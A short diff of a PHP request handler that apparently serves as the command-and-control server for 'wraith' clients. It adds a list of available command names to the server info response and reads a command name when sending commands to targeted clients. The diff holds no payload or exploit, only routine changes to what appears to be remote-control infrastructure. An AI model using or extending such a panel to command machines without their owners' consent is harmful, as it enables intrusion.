@@ -255,10 +255,14 @@ if ($response["requester_type"] === "wraith") {
 	if ($req_type === "getinfo") {
 		// Get some information about the server and connected wraiths
 		$db = get_db();
+		$cmds = get_cmds();
+		$cmd_names = [];
+		foreach ($cmds as $name => $path) { array_push($cmd_names, $name); }
 		$response["status"] = "SUCCESS";
 		$response["data"] = json_encode([
-			"Active Wraiths" => sizeof($db["active_wraith_clients"]),
-			"Available Commands" => sizeof(get_cmds()),
+			"Active Wraith Count" => sizeof($db["active_wraith_clients"]),
+			"Available Command Count" => sizeof($cmds),
+			"Available Commands" => implode(", ", $cmd_names),
 			"API Address" => get_current_url($_SERVER),
 		]);
 		respond();
@@ -278,6 +282,7 @@ if ($response["requester_type"] === "wraith") {
 	} elseif ($req_type === "sendcommand") {
 		// Send a command to a/multiple wraith/s
 		$targets = $request["data"]["targets"];
+		$command = $request["data"]["commandname"];
 		respond();
 		
 	} elseif ($req_type === "settings") {
